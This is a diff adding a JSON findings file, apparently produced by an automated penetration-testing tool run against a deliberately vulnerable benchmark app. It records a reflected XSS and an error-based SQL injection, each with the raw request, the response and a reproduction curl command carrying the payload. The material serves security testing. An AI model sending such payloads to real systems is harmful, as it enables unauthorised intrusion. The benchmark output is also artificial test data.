@@ -1,0 +1,72 @@
+[
+  {
+    "id": "585303cd-39a7-4fe3-91b4-798a162d420a",
+    "project_id": "77df1a49-aea1-4610-afdb-f58999aba691",
+    "endpoint_id": null,
+    "wstg_id": "WSTG-INPV-01",
+    "title": "Reflected Cross-Site Scripting (XSS) in 'name' Parameter (/ssti/render)",
+    "description": "Query parameter 'name' on /ssti/render reflects unescaped executable <script> HTML markup directly into the text/html DOM response.",
+    "severity": "Medium",
+    "status": "Confirmed",
+    "confidence": "Confirmed",
+    "cvss_score": null,
+    "cvss_vector": null,
+    "cwe_id": "CWE-79",
+    "owasp_category": null,
+    "affected_parameter": "name",
+    "detection_source": "check_runner",
+    "remediation_guidance": null,
+    "business_impact": null,
+    "is_simulated": false,
+    "created_at": "2026-11-18T04:13:17.946063Z",
+    "updated_at": "2026-11-18T04:13:17.946065Z",
+    "evidence": [
+      {
+        "id": "96d9a744-f534-468b-bf60-4b3657f92326",
+        "finding_id": "585303cd-39a7-4fe3-91b4-798a162d420a",
+        "raw_request": "GET /ssti/render?name=%3Cscript%3Ealert%28%27pentesa_xss_8421%27%29%3C/script%3E HTTP/1.1\r\nHost: bench-pentesa-app:8080\r\n\r\n",
+        "raw_response": "HTTP/1.1 200\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<html><body><h1>Hello <script>alert('pentesa_xss_8421')</script>!</h1></body></html>",
+        "reproduction_curl": "curl -i -s \"http://bench-pentesa-app:8080/ssti/render?name=%3Cscript%3Ealert%28%27pentesa_xss_8421%27%29%3C/script%3E\"",
+        "request_hash_sha256": "fe55f9e43b014e0fce99c66baf11c462bf666b09434da370b000219ae6cbdb08",
+        "response_hash_sha256": "34f4899511e7f76f722ac4e8a3b823d1c2cb8882bb2375ea34b4f273d65a4b12",
+        "screenshot_path": null,
+        "captured_at": "2026-11-18T04:13:17.948767Z"
+      }
+    ]
+  },
+  {
+    "id": "c03b79af-b606-4868-8e76-3b54bcd1b67c",
+    "project_id": "77df1a49-aea1-4610-afdb-f58999aba691",
+    "endpoint_id": null,
+    "wstg_id": "WSTG-INPV-05",
+    "title": "SQL Injection in 'q' Parameter (/sqli/search)",
+    "description": "Error-based SQL injection confirmed on /sqli/search?q= returning database syntax details or HTTP 500.",
+    "severity": "Critical",
+    "status": "Confirmed",
+    "confidence": "Confirmed",
+    "cvss_score": null,
+    "cvss_vector": null,
+    "cwe_id": "CWE-89",
+    "owasp_category": null,
+    "affected_parameter": "q",
+    "detection_source": "check_runner",
+    "remediation_guidance": null,
+    "business_impact": null,
+    "is_simulated": false,
+    "created_at": "2026-11-18T04:13:14.219445Z",
+    "updated_at": "2026-11-18T04:13:14.219448Z",
+    "evidence": [
+      {
+        "id": "1cd45ee8-202f-4534-b6f5-070bc02eb207",
+        "finding_id": "c03b79af-b606-4868-8e76-3b54bcd1b67c",
+        "raw_request": "GET /sqli/search?q=%27%29%29 HTTP/1.1\r\nHost: bench-pentesa-app:8080\r\n\r\n",
+        "raw_response": "HTTP/1.1 500\r\n\r\n{\"error\":\"SQL Error\",\"details\":\"near \\\")\\\": syntax error\",\"query\":\"SELECT id, name, description, price FROM products WHERE name LIKE '%'))%'\"}",
+        "reproduction_curl": "curl -i -s \"http://bench-pentesa-app:8080/sqli/search?q=%27%29%29\"",
+        "request_hash_sha256": "b6e1ab97874fe42e3073b9c7c714a27e1521d22d67159b3b981716beac76bd83",
+        "response_hash_sha256": "4867745e84e758f935921121f559ce272021846ea891eba8f603ac5fc7c9a4ad",
+        "screenshot_path": null,
+        "captured_at": "2026-11-18T04:13:14.226122Z"
+      }
+    ]
+  }
+]
